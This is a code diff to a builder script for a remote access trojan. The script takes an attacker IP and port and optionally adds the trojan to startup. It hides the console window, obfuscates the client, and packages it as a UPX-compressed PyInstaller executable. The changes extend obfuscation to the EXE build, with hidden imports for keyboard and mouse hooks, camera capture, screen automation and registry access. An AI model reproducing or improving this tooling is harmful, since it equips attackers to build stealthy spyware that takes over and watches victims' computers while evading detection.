@@ -16,10 +16,10 @@ if randomizer=="y" or randomizer=="Y":
 else:
     port=int(input("Port:"))
 startup=input("Add rat to startup when starts? (Y/N)")
+obfuscated=input("Obfuscated? (Y/N)")
 exepy=input("EXE or PY?")
 if exepy=="py" or exepy=="PY" or exepy=="Py" or exepy=="pY":
     noconsole=input("hide rat console? (Y/N)")
-    obfuscated=input("Obfuscated? (Y/N)")
 
 def py(ip,port,name,noconsole,obf,startup,randomizer):
     os.system("md temp")
@@ -87,12 +87,12 @@ if __name__ == '__main__':
         print("creating server...")
         server=open(f"temp\server.py","a")
         servercontent=f"""
-    rat = RAT_SERVER('{ip}', {port})
+rat = RAT_SERVER('{ip}', {port})
 
-    if __name__ == '__main__':
-        rat.build_connection()
-        rat.execute()
-        """
+if __name__ == '__main__':
+    rat.build_connection()
+    rat.execute()
+"""
         server.write(servercontent)
         server.close()
         print("server created")
@@ -101,25 +101,37 @@ if __name__ == '__main__':
         os.system("src\obfuscator.pyw -o temp\clientobf.py temp\client.py")
         print("obfuscated!")
         if noconsole==True:
-            os.system(f"copy temp\clientobf.py {name}.pyw")
-            os.system(f"copy temp\server.py {name}_server.py")
+            if randomizer==True:
+                os.system(f"copy temp\clientobf.py {name}.pyw")
+            else:
+                os.system(f"copy temp\clientobf.py {name}.pyw")
+                os.system(f"copy temp\server.py {name}_server.py")
         else:
-            os.system(f"copy temp\clientobf.py {name}.py")
-            os.system(f"copy temp\server.py {name}_server.py")
+            if randomizer==True:
+                os.system(f"copy temp\clientobf.py {name}.py")
+            else:
+                os.system(f"copy temp\clientobf.py {name}.py")
+                os.system(f"copy temp\server.py {name}_server.py")
     else:
         if noconsole==True:
-            os.system(f"copy temp\client.py {name}.pyw")
-            os.system(f"copy temp\server.py {name}_server.py")
+            if randomizer==True:
+                os.system(f"copy temp\client.py {name}.pyw")
+            else:
+                os.system(f"copy temp\client.py {name}.pyw")
+                os.system(f"copy temp\server.py {name}_server.py")
         else:
-            os.system(f"copy temp\client.py {name}.py")
-            os.system(f"copy temp\server.py {name}_server.py")
-    print("modified name")
+            if randomizer==True:
+                os.system(f"copy temp\client.py {name}.py")
+            else:
+                os.system(f"copy temp\client.py {name}.py")
+                os.system(f"copy temp\server.py {name}_server.py")
+    print("copyed archives")
     print("clearing temp...")
     os.system("rd /q /s temp")
     print("cleared")
     print("rat complete")
 
-def exe(ip,port,name,startup,randomizer):
+def exe(ip,port,name,startup,obf,randomizer):
     os.system("md temp")
     print("Building py...")
     os.system(r"copy src\client.py temp\client.py")
@@ -185,21 +197,26 @@ if __name__ == '__main__':
         print("creating server...")
         server=open(f"temp\server.py","a")
         servercontent=f"""
-    rat = RAT_SERVER('{ip}', {port})
+rat = RAT_SERVER('{ip}', {port})
 
-    if __name__ == '__main__':
-        rat.build_connection()
-        rat.execute()
-        """
+if __name__ == '__main__':
+    rat.build_connection()
+    rat.execute()
+"""
         server.write(servercontent)
         server.close()
         print("server created")
+        os.system(f"copy temp\server.py {name}_server.py")
+        print("server copyed")
     print("transforming to .exe ...")
-    os.system("pyinstaller --onefile --noconsole --i=NONE --upx-dir=src temp\client.py")
+    if obf==True:
+        os.system("src\obfuscator.pyw -o temp\clientobf.py temp\client.py")
+        os.system("pyinstaller --onefile --noconsole --upx-dir=src --hidden-import=random --hidden-import=socket --hidden-import=subprocess --hidden-import=os --hidden-import=platform --hidden-import=threading --hidden-import=PIL --hidden-import=datetime --hidden-import=ctypes --hidden-import=comtypes --hidden-import=winreg --hidden-import=shutil --hidden-import=glob --hidden-import=sys --hidden-import=webbrowser --hidden-import=re --hidden-import=pyautogui --hidden-import=cv2 --hidden-import=urllib.request --hidden-import=json --hidden-import=pynput.keyboard --hidden-import=pynput.mouse --hidden-import=time --hidden-import=keyboard --hidden-import=requests temp\clientobf.py")
+    else:
+        os.system("pyinstaller --onefile --noconsole --i=NONE --upx-dir=src temp\client.py")
     print("transformed .exe!")
     os.system(f"copy dist\client.exe {name}.exe")
-    os.system(f"copy temp\server.py {name}_server.py")
-    print("modified name")
+    print("copyed archives")
     print("clearing temp...")
     os.system("rd /q /s temp")
     os.system("rd /q /s build")
@@ -235,5 +252,9 @@ if exepy=="exe" or exepy=="Exe" or exepy=="eXe" or exepy=="exE" or exepy=="EXe" 
         randoms=True
     else:
         randoms=False
-    exe(ip=ip,port=port,name=name,startup=starts,randomizer=randoms)
+    if obfuscated=="y" or obfuscated=="Y":
+        obfus=True
+    else:
+        obfus=False
+    exe(ip=ip,port=port,name=name,startup=starts,randomizer=randoms,obf=obfus)
 os.system("pause")
